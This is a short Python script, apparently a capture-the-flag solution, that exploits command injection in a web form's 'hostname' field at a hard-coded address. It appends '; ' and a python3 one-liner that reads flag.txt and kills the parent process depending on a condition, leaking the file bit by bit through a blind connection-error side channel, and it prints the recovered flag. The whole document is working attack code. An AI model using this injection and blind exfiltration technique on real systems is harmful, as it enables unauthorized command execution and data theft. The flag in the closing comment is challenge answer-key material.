import requests
import string
host = 'http://34.130.180.82:50517/' # replace with your actual host
def send(command):
    try:
        r = requests.post(host, data={'hostname': 'a; ' + command})
        return False
    except requests.exceptions.ConnectionError:
        return True
    
def test(cond):
    # single quotes required in cond
    return send(r'''python3 -c "import os; flag = open('flag.txt').read(); os.popen('kill -9 $PPID') if (''' + cond + ') else 1"')

def leakchar(c):
    n = 0
    for i in range(8):
        b = test(f"(ord({c}) & (1<<{i})) > 0")
        if b: b = 1 
        else: b = 0
        #print(b)
        n += b << i
    return chr(n)

def getlen(s):
    l = 0
    while not test(f"len({s}) == {l}"):
        l += 1 
    return l 

#print(getlen('flag'))
# flag length = 19

flaglen = 19
def leakstr(s, l):
    res = ''
    for i in range(l):
        res += leakchar(f"{s}[{i}]")
        print(res)
    return res
flag = leakstr('flag', flaglen)
print(flag)
# LITCTF{c4refu1_fr}


